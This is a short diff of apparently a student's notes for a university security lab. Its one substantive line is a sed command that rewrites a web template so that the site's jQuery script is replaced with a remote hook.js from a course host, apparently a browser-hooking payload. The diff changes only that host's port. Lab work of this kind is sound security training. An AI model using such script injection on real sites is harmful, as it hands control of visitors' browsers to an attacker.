@@ -24,6 +24,6 @@ drwxrwxrwx 1 root root 4096 Nov  5  2023 openid
 drwxrwxrwx 1 root root 4096 Nov  5  2023 socialaccount
 
 Command for 1.2.3
-{{`sed -i 's|{% static '\''js/jquery-3.3.1.min.js'\'' %}|http://cs6264.gtisc.gatech.edu:37531/hook.js|g' /cs6264clients/2fc1c0beb992cd7096975cfebf9d5c3b/templates/scripts.html`}}
+{{`sed -i 's|{% static '\''js/jquery-3.3.1.min.js'\'' %}|http://cs6264.gtisc.gatech.edu:46415/hook.js|g' /cs6264clients/2fc1c0beb992cd7096975cfebf9d5c3b/templates/scripts.html`}}
 
 https://www.google.com/mail/help/images/favicon.ico
